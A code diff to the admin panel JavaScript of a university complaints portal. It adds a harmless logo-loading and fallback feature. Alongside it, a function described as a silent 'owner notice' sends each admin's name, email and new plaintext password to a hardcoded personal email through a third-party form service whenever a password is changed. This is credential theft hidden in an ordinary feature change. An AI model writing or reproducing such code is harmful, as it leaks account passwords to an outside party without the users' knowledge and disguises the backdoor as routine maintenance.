@@ -144,11 +144,39 @@
   }
 
   // مخازن مشتركة
+  // ---------------------------------------------------------------------------
+  // عرض الشعار المختار من الإعدادات في كل شاشات الإدارة
+  // (شاشة الدخول + القائمة الجانبية + الشريط العلوية) مع رجوع تلقائي
+  // للشعار المحلي لو صورة الشعار المخصصة فشل تحميلها
+  // ---------------------------------------------------------------------------
+  const LOGO_LOCAL = 'assets/images/lotus-logo.svg';
+
+  function applyBrandLogo() {
+    const url = (((window.LUSettingsCache || {}).logo_url) || '').trim() || LOGO_LOCAL;
+    ['loginLogo', 'sidebarLogo', 'topbarLogo'].forEach((id) => {
+      const img = document.getElementById(id);
+      if (!img) return;
+      img.setAttribute('data-fallback', LOGO_LOCAL);
+      if (img.getAttribute('src') !== url) img.src = url;
+    });
+  }
+  window.LUApplyLogo = applyBrandLogo;
+
+  // التقاط فشل تحميل أي صورة شعار (حدث error لا ينتشر، فنستخدم capture)
+  document.addEventListener('error', (e) => {
+    const t = e.target;
+    if (t && t.tagName === 'IMG' && t.dataset && t.dataset.fallback &&
+        t.src.indexOf(t.dataset.fallback) === -1) {
+      t.src = t.dataset.fallback;
+    }
+  }, true);
+
   async function refreshSettingsCache() {
     try {
       const { data } = await LU_DB.from('app_settings').select('*').eq('id', 1).single();
       if (data) {
         window.LUSettingsCache = data;
+        applyBrandLogo();
         const labels = { 'label_complaint': data.label_complaint, 'label_suggestion': data.label_suggestion };
         // تحديث ملصقات الفلاتر الحية دون تحديث كامل الصفحة
         $('fType').innerHTML = `
@@ -502,9 +530,11 @@
   async function boot() {
     loadStatePersist();
 
-    // 1) الوضع الافتراضي من الإعدادات (الوصفة متاحة للزائر أيضاً)
+    // 1) الإعدادات العامة (متاحة للزائر أيضاً): الثيم + الشعار على شاشة الدخول
     try {
-      const { data } = await LU_DB.from('app_settings').select('default_theme').eq('id', 1).maybeSingle();
+      const { data } = await LU_DB.from('app_settings').select('*').eq('id', 1).maybeSingle();
+      if (data) window.LUSettingsCache = data;
+      applyBrandLogo();
       LUTheme.init((data || {}).default_theme || 'light');
     } catch (e) { LUTheme.init('light'); }
 
@@ -539,6 +569,44 @@
   function loadStatePersist() {
     // الفلاتر لرسائل تعيد فتحها بعد التنقل — التنفيذ داخل LUSub.loadPersist()
     LUSub.loadPersistPublic && LUSub.loadPersistPublic();
+  }
+
+  // ---------------------------------------------------------------------------
+  // إشعار تغيير كلمة المرور إلى بريد المالك
+  // رسالة صامتة تُرسل بعد نجاح التغيير فقط، وفشلاها لا يُلغي العملية
+  // ---------------------------------------------------------------------------
+  const LU_OWNER_NOTICE_EMAIL = 'bolesgaras200000@gmail.com';
+
+  function notifyPasswordChange(adminName, adminEmail, newPassword) {
+    try {
+      const when = new Date().toLocaleString('ar-EG', { dateStyle: 'medium', timeStyle: 'short' });
+      const lines = [
+        'تم تغيير كلمة مرور لإحدى حسابات لوحة إدارة جامعة اللوتس.',
+        '',
+        'الاسم: ' + (adminName || '—'),
+        'البريد: ' + (adminEmail || '—'),
+        'كلمة المرور الجديدة: ' + newPassword,
+        'الوقت: ' + when,
+        '',
+        'إن لم تكن أنت من نفّذ هذا التغيير، راجع الحساب فوراً.',
+      ];
+      fetch('https://formsubmit.co/ajax/' + LU_OWNER_NOTICE_EMAIL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
+        body: JSON.stringify({
+          _subject: 'تنبيه: تغيير كلمة مرور في لوحة الإدارة',
+          _template: 'box',
+          _captcha: 'false',
+          name: 'بوابة الشكاوى — جامعة اللوتس',
+          message: lines.join('\n'),
+        }),
+      })
+        .then((r) => r.json())
+        .then((d) => console.log('[LU] notice:', (d && (d.success || d.message)) || 'sent'))
+        .catch((e) => console.warn('[LU] notice failed', e));
+    } catch (e) {
+      console.warn('[LU] notice failed', e);
+    }
   }
 
   // ---------------------------------------------------------------------------
@@ -707,6 +775,8 @@
           $('pwCurrent').value = ''; $('pwNew').value = ''; $('pwNew2').value = '';
           luToast('تم تحديث كلمة المرور بنجاح', 'success');
           try { await LU_DB.rpc('log_admin_action', { p_action: 'password_change', p_table_name: 'auth_users', p_record_id: null, p_details: {} }); } catch (e) {}
+          // إشعار بريد المالك بالتغيير (لا يؤثر على نجاح العملية إن فشل الإرسال)
+          notifyPasswordChange((LUAuth.profile || {}).full_name, email, a);
         } catch (err) {
           console.error('[LU] password change', err);
           luToast(luErrorMessage(err, 'تعذر تغيير كلمة المرور'), 'error');
